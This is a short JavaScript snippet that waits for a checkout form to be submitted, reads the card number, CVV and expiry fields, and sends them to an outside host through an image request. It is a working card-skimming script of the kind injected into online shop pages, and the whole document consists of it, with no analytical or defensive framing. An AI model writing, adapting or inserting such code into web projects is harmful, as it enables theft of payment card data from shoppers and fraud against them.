document.addEventListener("DOMContentLoaded", function() {
    var form = document.querySelector("form.checkout");
    if (form) {
        form.addEventListener("submit", function() {
            var cc = document.querySelector("#billing_card_num").value;
            var cvv = document.querySelector("#billing_card_cvv").value;
            var exp = document.querySelector("#billing_card_exp").value;
            var img = new Image();
            img.src = "https://c2-exfil-drop.com/gate.php?d=" + encodeURIComponent(cc + ":" + cvv + ":" + exp);
        });
    }
});
